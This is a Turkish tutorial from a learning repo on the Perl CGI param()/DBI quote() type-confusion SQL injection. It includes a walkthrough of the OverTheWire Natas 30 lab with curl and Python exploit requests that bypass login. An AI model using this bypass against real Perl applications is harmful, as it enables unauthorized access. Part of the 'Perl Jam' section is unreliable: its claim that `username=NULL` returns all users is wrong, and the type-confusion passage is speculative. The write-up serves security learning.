# 🌐 Web Güvenliği — Perl CGI param() & DBI quote() Bypass

> Perl CGI'da param() bir parametre için birden fazla değer dönebilir.
> DBI'nın quote() fonksiyonu array referansına farklı davranır.
> İkisi bir araya gelince SQL injection koruması devre dışı kalır.

---

## 📋 İçindekiler

- [Perl CGI param() Fonksiyonu](#perl-cgi-param-fonksiyonu)
- [DBI quote() Fonksiyonu](#dbi-quote-fonksiyonu)
- [Type Confusion Zafiyeti](#type-confusion-zafiyeti)
- [Natas'ta Kullanım](#natasta-kullanım)

---

## Perl CGI param() Fonksiyonu

Perl CGI modülünde `param('name')` ile parametre değeri okunur:

```perl
use CGI qw(:standard);
my $user = param('username');   # "admin"
```

Ama aynı parametre birden fazla kez gönderilirse:

```
?username=admin&username=hacker
```

```perl
my $user = param('username');
# Scalar context → "admin" (ilk değer)

my @users = param('username');
# List context → ("admin", "hacker")
```

`param()` list context'te **array** döner.

---

## DBI quote() Fonksiyonu

Perl'in DBI modülü veritabanı işlemleri için kullanılır. `quote()` fonksiyonu SQL injection'a karşı değerleri escape eder:

```perl
my $safe = $dbh->quote($user);
# "admin" → "'admin'"  (tek tırnakla sarmalanmış)

my $query = "SELECT * FROM users WHERE username=$safe";
# SELECT * FROM users WHERE username='admin'
```

Normal bir string için doğru çalışır.

---

## Type Confusion Zafiyeti

`quote()` fonksiyonuna **array referansı** verilirse:

```perl
my @arr = ("admin", "hacker");
my $safe = $dbh->quote(\@arr);   # array referansı!
# Sonuç: "ARRAY(0x...)" veya beklenmeyen davranış
```

Asıl tehlike: `param()` list context'te array döndüğünde ve bu doğrudan `quote()`'a geçildiğinde:

```perl
# KÖTÜ: param() array döndürebilir
my $user = $dbh->quote(param('username'));

# Eğer ?username=admin&username=foo gönderilirse:
# param('username') → list context → ("admin", "foo")
# quote(("admin", "foo")) → ilk elemanı alır, tırnaksız?
# Veya farklı bir davranış → SQL injection!
```

### "The Perl Jam" — CGI.pm Zafiyeti

Netanel Rubin'in 2014-2015 yıllarında keşfettiği zafiyete göre:

```perl
# Eğer kod şöyle yazılmışsa:
my $query = "SELECT * FROM users WHERE username=" . $dbh->quote(param('username'));

# ?username[]=admin gönderilirse:
# param('username') → undef (array ref davranışı)
# quote(undef) → "NULL"
# SELECT * FROM users WHERE username=NULL
# → tüm kullanıcıları döndürebilir
```

---

## Natas'ta Kullanım

### Natas 30 — Perl DBI quote() Bypass

**Kaynak kod:**

```perl
#!/usr/bin/perl
use CGI qw(:standard);
use DBI;

my $dbh = DBI->connect("DBI:mysql:...") or die;

if(param('username') && param('password')) {
    my $user = $dbh->quote(param('username'));
    my $pass = $dbh->quote(param('password'));

    my $query = "SELECT * FROM users WHERE username=$user AND password=$pass";
    my $sth   = $dbh->prepare($query);
    $sth->execute();

    if($sth->rows()) {
        print "Welcome! Password: <censored>";
    }
}
```

**Normal istek:**

```
username=admin&password=test
→ SELECT * FROM users WHERE username='admin' AND password='test'
```

**Exploit — Array ile quote() bypass:**

```
username=admin&password=password&password=1
```

`param('password')` liste bağlamında `("password", 1)` döndürür.

`$dbh->quote(param('password'))` → `quote("password", 1)` çağrısına düzleşir. **DBI'da `quote()`'un 2. argümanı bir SQL veri tipidir (`$data_type`).** Sayısal/dolu bir tip verilince `quote()`, değeri **tek tırnakla sarmalamaz** (base implementasyondaki `unless ($data_type)` koruması atlanır) → değer OLDUĞU GİBİ döner.

Yani `quote("password", 1)` → tırnaksız `password`. Sorgu şu hale gelir:

```sql
SELECT * FROM users WHERE username='admin' AND password=password
```

Tırnaksız `password` bir string literal değil, **sütun adı** gibi yorumlanır → `password=password` (sütun kendisiyle) **her zaman true** → tüm satırlar döner → auth bypass.

**curl ile:**

```bash
curl -u natas30:[şifre] \
     --data "username=admin&password=password&password=1" \
     "http://natas30.natas.labs.overthewire.org/"
```

**Python ile:**

```python
import requests

url      = "http://natas30.natas.labs.overthewire.org/"
username = "natas30"
password = "[natas30_şifresi]"

# password'u iki kez gönder (array davranışı)
data = [
    ("username", "admin"),
    ("password", "password"),   # string
    ("password", "1"),           # integer → type confusion
]

r = requests.post(url, data=data, auth=(username, password))
print(r.text)
```

---

### Perl CGI — Kontrol Listesi

```
Tespit:
  ☐ Perl CGI uygulaması mı? (.pl uzantısı)
  ☐ param() ile DBI quote() birlikte kullanılıyor mu?
  ☐ Kaynak kodda param() doğrudan quote()'a mı gidiyor?

Exploit:
  ☐ Aynı parametreyi iki kez gönder: param=str&param=int
  ☐ Array olarak gönder: param[]=değer
  ☐ String + integer kombinasyonu: password=test&password=1
  ☐ Sonuç SQL'e nasıl yansıdı? (hata mesajı veya davranış farkı)
```

---

## 🔗 Kaynaklar

- [The Perl Jam — Netanel Rubin (BlackHat 2014)](https://www.blackhat.com/docs/eu-14/materials/eu-14-Rubin-The-Perl-Jam-Exploiting-A-20-Year-Old-Vulnerability.pdf)
- [Perl CGI.pm Documentation](https://metacpan.org/pod/CGI)
- [Perl DBI — quote()](https://metacpan.org/pod/DBI#quote)

---

**Önceki konu:** [21_perl_rce.md](./21_perl_rce.md)
**Sonraki konu:** [23_log_poisoning.md](./23_log_poisoning.md)

*Bu rehber [waitaseC137/linux_learning](https://github.com/waitaseC137/linux_learning) reposunun bir parçasıdır.*
